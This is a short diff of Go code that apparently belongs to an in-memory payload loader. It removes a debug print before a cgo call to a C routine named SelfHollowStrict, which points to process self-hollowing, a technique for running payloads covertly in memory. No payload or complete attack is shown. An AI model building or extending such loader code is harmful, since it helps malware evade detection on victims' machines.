@@ -22,7 +22,6 @@ func ExecuteInMemory(payload []byte) error {
 		return fmt.Errorf("invalid payload size: %d bytes. Minimum 512 bytes expected", len(payload))
 	}
 	
-	fmt.Println("Go: About to call C.SelfHollowStrict"); // Go-side log
 	success := C.SelfHollowStrict(
 		(*C.uchar)(unsafe.Pointer(&payload[0])),
 		C.size_t(len(payload)),
